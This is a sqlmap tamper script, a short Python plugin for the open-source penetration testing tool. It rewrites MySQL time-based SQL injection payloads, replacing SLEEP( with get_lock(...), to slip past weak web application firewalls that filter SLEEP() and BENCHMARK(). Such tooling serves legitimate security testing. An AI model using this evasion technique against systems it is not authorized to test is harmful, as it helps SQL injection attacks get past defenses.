#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces instances like 'SLEEP(5)' with (e.g.) "get_lock('ETgP',5)"

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0 and 5.5

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that filter the SLEEP() and BENCHMARK() functions

        * Reference: https://zhuanlan.zhihu.com/p/35245598

    >>> tamper('SLEEP(5)') == "get_lock('%s',5)" % kb.aliasName
    True
    """

    if payload:
        payload = payload.replace("SLEEP(", "get_lock('%s'," % kb.aliasName)

    return payload
